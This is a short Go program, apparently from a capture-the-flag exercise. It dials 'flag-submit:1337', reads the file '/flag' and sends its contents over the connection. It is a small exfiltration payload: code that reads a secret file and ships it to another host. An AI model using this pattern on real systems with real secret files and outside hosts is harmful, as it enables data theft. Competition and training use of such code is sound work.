package main

import (
	"fmt"
	"io/ioutil"
	"net"
)

func main() {
	conn, err := net.Dial("tcp", "flag-submit:1337")
	if err != nil {
		panic(err)
	}

	flagBytes, err := ioutil.ReadFile("/flag")
	if err != nil {
		panic(err)
	}

	fmt.Fprintf(conn, string(flagBytes))
}
